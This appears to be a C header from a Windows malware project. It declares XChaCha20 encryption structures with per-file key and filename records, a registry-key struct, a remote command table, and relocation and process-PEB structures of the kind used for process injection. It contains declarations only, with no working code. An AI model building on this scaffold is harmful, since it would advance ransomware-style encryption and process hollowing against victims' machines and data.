#ifndef ARMADILLO_MASTER_HPP
#define ARMADILLO_MASTER_HPP

#include <windows.h>
#include <wininet.h>
#include <psapi.h>
#include <sodium.h>
#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include <time.h>
#include <fetch.h>
#include <shlobj.h>
#include <commctrl.h>

#pragma comment(lib, "sodium.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")

#define KEY_LENGTH crypto_aead_xchacha20poly1305_ietf_KEYBYTES
#define IV_LENGTH crypto_aead_xchacha20poly1305_ietf_NPUBBYTES
#define MAX_VALUE_NAME 16383
#define MAX_PATH_LEN 260
#define BUFFER_SIZE 4096
#define RANDOM_RANGE 16
#define UUID_LENGTH 36

typedef char *(*Function)(char **);

typedef struct
{
	HKEY hKey;
	LPCSTR lpSubKey;
	LPCSTR lpValueName;
	const char *lpData;
} RegKey;

typedef struct
{
	int keyLength;
	int ivLength;
	unsigned char iv[IV_LENGTH];
	unsigned char key[KEY_LENGTH];
} KeyIV;

typedef struct
{
	long size;
	unsigned char *text;
	unsigned char tag[crypto_aead_xchacha20poly1305_ietf_ABYTES];
} Cipher;

typedef struct
{
	unsigned char *text;
	long size;
} File;

typedef struct
{
	KeyIV keyiv;
	const char *filename;
	unsigned char tag[crypto_aead_xchacha20poly1305_ietf_ABYTES];
} Meta;

typedef struct Node
{
	Meta data;
	struct Node *next;
} Node;

typedef struct
{
	TCHAR **paths;
	size_t count;
	size_t capacity;
} FilePaths;

typedef struct
{
	const char *name;
	Function Fn;
} Operation;

typedef struct
{
	const char *id;
	const char *command;
} Command;

typedef struct IMAGE_RELOCATION_ENTRY
{
	WORD Offset : 12;
	WORD Type : 4;
} IMAGE_RELOCATION_ENTRY, *PIMAGE_RELOCATION_ENTRY;

struct ProcessAddressInformation
{
	LPVOID lpProcessPEBAddress;
	LPVOID lpProcessImageBaseAddress;
};

#endif